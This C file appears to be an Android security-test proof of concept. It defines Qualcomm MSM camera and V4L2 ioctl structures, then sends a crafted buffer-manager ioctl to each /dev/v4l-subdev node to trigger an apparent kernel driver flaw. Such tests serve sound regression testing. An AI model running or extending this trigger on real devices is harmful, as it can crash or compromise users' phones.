/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#define _GNU_SOURCE
#include <sys/wait.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include "local_poc.h"

#define VIDEO_MAX_PLANES 8
#define MAX_PLANES VIDEO_MAX_PLANES
#define MSM_CPP_MSG_ID_TRAILER 0xABCDEFAA

enum msm_cpp_batch_mode_t {
  BATCH_MODE_NONE,
  BATCH_MODE_VIDEO,
  BATCH_MODE_PREVIEW
};

struct msm_cpp_batch_info_t {
  enum msm_cpp_batch_mode_t batch_mode;
  uint32_t batch_size;
  uint32_t intra_plane_offset[MAX_PLANES];
  uint32_t pick_preview_idx;
  uint32_t cont_idx;
};

struct msm_cpp_buffer_info_t {
  int32_t fd;
  uint32_t index;
  uint32_t offset;
  uint8_t native_buff;
  uint8_t processed_divert;
  uint32_t identity;
};

enum msm_cpp_frame_type {
  MSM_CPP_OFFLINE_FRAME,
  MSM_CPP_REALTIME_FRAME,
};

struct msm_cpp_frame_info_t {
  int32_t frame_id;
  struct timeval timestamp;
  uint32_t inst_id;
  uint32_t identity;
  uint32_t client_id;
  enum msm_cpp_frame_type frame_type;
  uint32_t num_strips;
  uint32_t msg_len;
  uint32_t *cpp_cmd_msg;
  int src_fd;
  int dst_fd;
  struct timeval in_time, out_time;
  void __user *cookie;
  int32_t *status;
  int32_t duplicate_output;
  uint32_t duplicate_identity;
  uint32_t feature_mask;
  uint8_t we_disable;
  struct msm_cpp_buffer_info_t input_buffer_info;
  struct msm_cpp_buffer_info_t output_buffer_info[8];
  struct msm_cpp_buffer_info_t duplicate_buffer_info;
  struct msm_cpp_buffer_info_t tnr_scratch_buffer_info[2];
  uint32_t reserved;
  uint8_t partial_frame_indicator;
  uint8_t first_payload;
  uint8_t last_payload;
  uint32_t first_stripe_index;
  uint32_t last_stripe_index;
  uint32_t stripe_info_offset;
  uint32_t stripe_info;
  struct msm_cpp_batch_info_t batch_info;
};

struct msm_camera_v4l2_ioctl_t {
  uint32_t id;
  size_t len;
  int32_t trans_code;
  void __user *ioctl_ptr;
};

struct msm_cpp_stream_buff_info_t {
  uint32_t identity;
  uint32_t num_buffs;
  struct msm_cpp_buffer_info_t *buffer_info;
};

#define BASE_VIDIOC_PRIVATE 192 /* 192-255 are private */

#define VIDIOC_MSM_CPP_CFG \
  _IOWR('V', BASE_VIDIOC_PRIVATE, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_IOMMU_ATTACH \
  _IOWR('V', BASE_VIDIOC_PRIVATE + 18, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_ENQUEUE_STREAM_BUFF_INFO \
  _IOWR('V', BASE_VIDIOC_PRIVATE + 6, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_POP_STREAM_BUFFER \
  _IOWR('V', BASE_VIDIOC_PRIVATE + 17, struct msm_camera_v4l2_ioctl_t)

struct v4l2_fract {
  __u32 numerator;
  __u32 denominator;
};

struct v4l2_outputparm {
  __u32 capability;               /*  Supported modes */
  __u32 outputmode;               /*  Current mode */
  struct v4l2_fract timeperframe; /*  Time per frame in seconds */
  __u32 extendedmode;             /*  Driver-specific extensions */
  __u32 writebuffers;             /*  # of buffers for write */
  __u32 reserved[4];
};

/*
 *  CAPTURE PARAMETERS
 */
struct v4l2_captureparm {
  __u32 capability;               /*  Supported modes */
  __u32 capturemode;              /*  Current mode */
  struct v4l2_fract timeperframe; /*  Time per frame in seconds */
  __u32 extendedmode;             /*  Driver-specific extensions */
  __u32 readbuffers;              /*  # of buffers for read */
  __u32 reserved[4];
};

/*  Stream type-dependent parameters
 */
struct v4l2_streamparm {
  __u32 type; /* enum v4l2_buf_type */
  union {
    struct v4l2_captureparm capture;
    struct v4l2_outputparm output;
    __u8 raw_data[200]; /* user-defined */
  } parm;
};

#define VIDIOC_S_PARM _IOWR('V', 22, struct v4l2_streamparm)

#define VIDIOC_STREAMON _IOW('V', 18, int)

struct v4l2_pix_format {
  __u32 width;
  __u32 height;
  __u32 pixelformat;
  __u32 field;        /* enum v4l2_field */
  __u32 bytesperline; /* for padding, zero if unused */
  __u32 sizeimage;
  __u32 colorspace; /* enum v4l2_colorspace */
  __u32 priv;       /* private data, depends on pixelformat */
  __u32 flags;      /* format flags (V4L2_PIX_FMT_FLAG_*) */
};

struct v4l2_plane_pix_format {
  __u32 sizeimage;
  __u16 bytesperline;
  __u16 reserved[7];
} __attribute__((packed));

struct v4l2_pix_format_mplane {
  __u32 width;
  __u32 height;
  __u32 pixelformat;
  __u32 field;
  __u32 colorspace;

  struct v4l2_plane_pix_format plane_fmt[VIDEO_MAX_PLANES];
  __u8 num_planes;
  __u8 flags;
  __u8 reserved[10];
} __attribute__((packed));

struct v4l2_rect {
  __s32 left;
  __s32 top;
  __u32 width;
  __u32 height;
};

struct v4l2_vbi_format {
  __u32 sampling_rate; /* in 1 Hz */
  __u32 offset;
  __u32 samples_per_line;
  __u32 sample_format; /* V4L2_PIX_FMT_* */
  __s32 start[2];
  __u32 count[2];
  __u32 flags;       /* V4L2_VBI_* */
  __u32 reserved[2]; /* must be zero */
};

struct v4l2_sliced_vbi_format {
  __u16 service_set;
  __u16 service_lines[2][24];
  __u32 io_size;
  __u32 reserved[2]; /* must be zero */
};
struct v4l2_sdr_format {
  __u32 pixelformat;
  __u32 buffersize;
  __u8 reserved[24];
} __attribute__((packed));

struct v4l2_clip {
  struct v4l2_rect c;
  struct v4l2_clip __user *next;
};

struct v4l2_window {
  struct v4l2_rect w;
  __u32 field; /* enum v4l2_field */
  __u32 chromakey;
  struct v4l2_clip __user *clips;
  __u32 clipcount;
  void __user *bitmap;
  __u8 global_alpha;
};

struct v4l2_format {
  __u32 type;
  union {
    struct v4l2_pix_format pix; /* V4L2_BUF_TYPE_VIDEO_CAPTURE */
    struct v4l2_pix_format_mplane
        pix_mp;                 /* V4L2_BUF_TYPE_VIDEO_CAPTURE_MPLANE */
    struct v4l2_window win;     /* V4L2_BUF_TYPE_VIDEO_OVERLAY */
    struct v4l2_vbi_format vbi; /* V4L2_BUF_TYPE_VBI_CAPTURE */
    struct v4l2_sliced_vbi_format sliced; /* V4L2_BUF_TYPE_SLICED_VBI_CAPTURE */
    struct v4l2_sdr_format sdr;           /* V4L2_BUF_TYPE_SDR_CAPTURE */
    __u8 raw_data[200];                   /* user-defined */
  } fmt;
};

enum v4l2_buf_type {
  V4L2_BUF_TYPE_VIDEO_CAPTURE = 1,
  V4L2_BUF_TYPE_VIDEO_OUTPUT = 2,
  V4L2_BUF_TYPE_VIDEO_OVERLAY = 3,
  V4L2_BUF_TYPE_VBI_CAPTURE = 4,
  V4L2_BUF_TYPE_VBI_OUTPUT = 5,
  V4L2_BUF_TYPE_SLICED_VBI_CAPTURE = 6,
  V4L2_BUF_TYPE_SLICED_VBI_OUTPUT = 7,
#if 1
  /* Experimental */
  V4L2_BUF_TYPE_VIDEO_OUTPUT_OVERLAY = 8,
#endif
  V4L2_BUF_TYPE_VIDEO_CAPTURE_MPLANE = 9,
  V4L2_BUF_TYPE_VIDEO_OUTPUT_MPLANE = 10,
  V4L2_BUF_TYPE_SDR_CAPTURE = 11,
  /* Deprecated, do not use */
  V4L2_BUF_TYPE_PRIVATE = 0x80,
};

/* map to v4l2_format.fmt.raw_data */
struct msm_v4l2_format_data {
  enum v4l2_buf_type type;
  unsigned int width;
  unsigned int height;
  unsigned int pixelformat; /* FOURCC */
  unsigned char num_planes;
  unsigned int plane_sizes[VIDEO_MAX_PLANES];
};

#define VIDIOC_S_FMT _IOWR('V', 5, struct v4l2_format)

struct v4l2_timecode {
  __u32 type;
  __u32 flags;
  __u8 frames;
  __u8 seconds;
  __u8 minutes;
  __u8 hours;
  __u8 userbits[4];
};

struct v4l2_plane {
  __u32 bytesused;
  __u32 length;
  union {
    __u32 mem_offset;
    unsigned long userptr;
    __s32 fd;
  } m;
  __u32 data_offset;
  __u32 reserved[11];
};

struct v4l2_buffer {
  __u32 index;
  __u32 type;
  __u32 bytesused;
  __u32 flags;
  __u32 field;
  struct timeval timestamp;
  struct v4l2_timecode timecode;
  __u32 sequence;

  /* memory location */
  __u32 memory;
  union {
    __u32 offset;
    unsigned long userptr;
    struct v4l2_plane *planes;
    __s32 fd;
  } m;
  __u32 length;
  __u32 reserved2;
  __u32 reserved;
};

#define VIDIOC_QBUF _IOWR('V', 15, struct v4l2_buffer)

/*
 *  MEMORY-MAPPING BUFFERS
 */
struct v4l2_requestbuffers {
  __u32 count;
  __u32 type;   /* enum v4l2_buf_type */
  __u32 memory; /* enum v4l2_memory */
  __u32 reserved[2];
};

#define VIDIOC_REQBUFS _IOWR('V', 8, struct v4l2_requestbuffers)

enum msm_camera_buf_mngr_cmd {
  MSM_CAMERA_BUF_MNGR_CONT_MAP,
  MSM_CAMERA_BUF_MNGR_CONT_UNMAP,
  MSM_CAMERA_BUF_MNGR_CONT_MAX,
};

struct msm_buf_mngr_main_cont_info {
  uint32_t session_id;
  uint32_t stream_id;
  enum msm_camera_buf_mngr_cmd cmd;
  uint32_t cnt;
  int32_t cont_fd;
};

#define MSM_CAMERA_MAX_USER_BUFF_CNT 16

struct msm_camera_user_buf_cont_t {
  unsigned int buf_cnt;
  unsigned int buf_idx[MSM_CAMERA_MAX_USER_BUFF_CNT];
};

enum msm_camera_buf_mngr_buf_type {
  MSM_CAMERA_BUF_MNGR_BUF_PLANAR,
  MSM_CAMERA_BUF_MNGR_BUF_USER,
  MSM_CAMERA_BUF_MNGR_BUF_INVALID,
};

struct msm_buf_mngr_info {
  uint32_t session_id;
  uint32_t stream_id;
  uint32_t frame_id;
  struct timeval timestamp;
  uint32_t index;
  uint32_t reserved;
  enum msm_camera_buf_mngr_buf_type type;
  struct msm_camera_user_buf_cont_t user_buf;
};

#define VIDIOC_MSM_BUF_MNGR_CONT_CMD \
  _IOWR('V', BASE_VIDIOC_PRIVATE + 36, struct msm_buf_mngr_main_cont_info)
#define VIDIOC_MSM_BUF_MNGR_GET_BUF \
  _IOWR('V', BASE_VIDIOC_PRIVATE + 33, struct msm_buf_mngr_info)

struct msm_camera_private_ioctl_arg {
  __u32 id;
  __u32 size;
  __u32 result;
  __u32 reserved;
  __user __u64 ioctl_ptr;
};

#define VIDIOC_MSM_BUF_MNGR_IOCTL_CMD \
  _IOWR('V', BASE_VIDIOC_PRIVATE + 40, struct msm_camera_private_ioctl_arg)

#define MSM_CAMERA_BUF_MNGR_IOCTL_ID_GET_BUF_BY_IDX 1

int main(void) {
  int fd, ret = 0;
  struct msm_camera_private_ioctl_arg arg;
  struct msm_buf_mngr_info info;
  int cmd;
  char subdev[32] = {0};

  for (int i = 0; i < 32; i++) {
    if (snprintf(subdev, sizeof(subdev), "/dev/v4l-subdev%d", i) < 0) {
      exit(EXIT_FAILURE);
    }

    fd = open(subdev, O_RDWR);
    if (fd == -1) {
      close(fd);
      continue;
    }

    memset(&arg, 0, sizeof(arg));
    memset(&info, 0, sizeof(info));
    info.session_id = 2;
    info.stream_id = 0;
    info.index = 0;
    arg.id = MSM_CAMERA_BUF_MNGR_IOCTL_ID_GET_BUF_BY_IDX;
    arg.size = sizeof(struct msm_buf_mngr_info);
    arg.ioctl_ptr = (__u64)&info;
    cmd = VIDIOC_MSM_BUF_MNGR_IOCTL_CMD;
    ret = ioctl(fd, cmd, &arg);

    close(fd);
  }
  return 0;
}
